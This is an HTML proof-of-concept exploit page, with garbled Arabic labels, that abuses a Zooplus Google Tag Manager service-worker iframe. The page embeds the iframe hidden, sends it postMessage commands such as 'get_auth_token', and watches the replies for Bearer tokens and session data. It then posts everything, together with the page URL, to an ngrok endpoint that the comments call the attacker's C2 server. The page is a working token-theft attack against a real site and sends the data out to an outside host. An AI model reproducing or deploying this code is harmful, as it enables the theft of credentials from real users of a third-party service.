<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>âš ï¸ PoC: Token Exfiltration via SW Bridge</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .terminal { background: #000; border: 1px solid #00ff41; padding: 20px; height: 400px; overflow-y: auto; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
        .log-entry { margin-bottom: 10px; border-bottom: 1px dotted #222; }
        .token-found { color: #ff003c; font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 0% {opacity:1;} 50% {opacity:0.3;} 100% {opacity:1;} }
        h2 { color: #fff; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

    <h2>Ù†Ø¸Ø§Ù… Ø§Ø³ØªØºÙ„Ø§Ù„ Ø¬Ø³Ø± Zooplus</h2>
    <div class="terminal" id="terminal">
        <div class="log-entry">> Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ù†Ø¸Ø§Ù… Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„...</div>
    </div>

    <iframe id="sw_bridge" name="google_tag_manager_static_20" 
            src="https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=https://egyhaker.github.io&1p=1" 
            style="display:none;"></iframe>

    <script>
        const terminal = document.getElementById('terminal');
        const bridge = document.getElementById('sw_bridge');
        const NGROK_URL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/token-leak";

        function log(msg, isCritical = false) {
            const div = document.createElement('div');
            div.className = 'log-entry';
            if (isCritical) div.classList.add('token-found');
            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        // 1. Ø§Ù„ØªÙ†ØµØª Ø¹Ù„Ù‰ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù‚Ø§Ø¯Ù…Ø© Ù…Ù† Ø§Ù„Ø¬Ø³Ø±
        window.addEventListener("message", (event) => {
            if (event.origin.includes("zooplus.com")) {
                log("ğŸ“¥ Ø±Ø¯ Ù…Ø³ØªÙ„Ù… Ù…Ù† Ø§Ù„Ø¬Ø³Ø±: " + JSON.stringify(event.data).substring(0, 100) + "...");
                
                // ÙØ­Øµ Ù…Ø§ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø±Ø¯ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ† Ø£Ùˆ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù‡ÙˆÙŠØ©
                if (event.data.stats || event.data.data) {
                    log("ğŸ”“ ØªÙ… ÙƒØ´Ù Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù„Ø³Ø© (targetId): " + (event.data.stats?.targetId || "Unknown"), true);
                    
                    // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ† Ø¥Ø°Ø§ ØªÙ… ØªÙ…Ø±ÙŠØ±Ù‡ ÙÙŠ Ø§Ù„Ù€ data
                    if (JSON.stringify(event.data).includes("Bearer")) {
                        log("ğŸ”¥ ØªÙ… ØµÙŠØ¯ Access Token Ø¨Ù†Ø¬Ø§Ø­!", true);
                    }

                    // 2. ØªÙ‡Ø±ÙŠØ¨ Ø§Ù„ØµÙŠØ¯ Ø¥Ù„Ù‰ Ø³ÙŠØ±ÙØ± Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… (C2 Server)
                    fetch(NGROK_URL, {
                        method: "POST",
                        mode: "no-cors",
                        body: JSON.stringify({
                            source: "SW_Relay_Exploit",
                            payload: event.data,
                            full_url: window.location.href
                        })
                    }).then(() => log("ğŸš€ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø³ÙŠØ±ÙØ± Ngrok."));
                }
            }
        });

        // 3. Ø¨Ø¯Ø¡ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ø³Ø±
        bridge.onload = () => {
            log("âœ… Ø§Ù„Ø¬Ø³Ø± (sw_iframe) ØªÙ… ØªØ­Ù…ÙŠÙ„Ù‡ Ø¨Ù†Ø¬Ø§Ø­.");
            log("ğŸ“¡ Ø¬Ø§Ø±ÙŠ Ù…Ø­Ø§ÙƒØ§Ø© Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ù„Ø³Ø­Ø¨ Ø§Ù„ØªÙˆÙƒÙ†...");

            const targetWindow = bridge.contentWindow;

            // Ø¥Ø±Ø³Ø§Ù„ Ø³Ù„Ø³Ù„Ø© Ø£ÙˆØ§Ù…Ø± Ù…ØªØªØ§Ø¨Ø¹Ø© Ù„Ø§Ø³ØªÙ†Ø·Ø§Ù‚ Ø§Ù„Ù€ Service Worker
            const payloads = [
                { type: 0, clientId: 'attack-v01', data: 'status_check' },
                { type: 0, clientId: 'attack-v01', data: 'identity_request' },
                { type: 0, clientId: 'attack-v01', data: 'get_auth_token' },
                { type: 'gtm.ready', data: {} }
            ];

            payloads.forEach((payload, index) => {
                setTimeout(() => {
                    log(`[â”] Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± #${index + 1}...`);
                    targetWindow.postMessage(payload, "https://stm.zooplus.com");
                }, 1500 * (index + 1));
            });
        };
    </script>
</body>
</html>
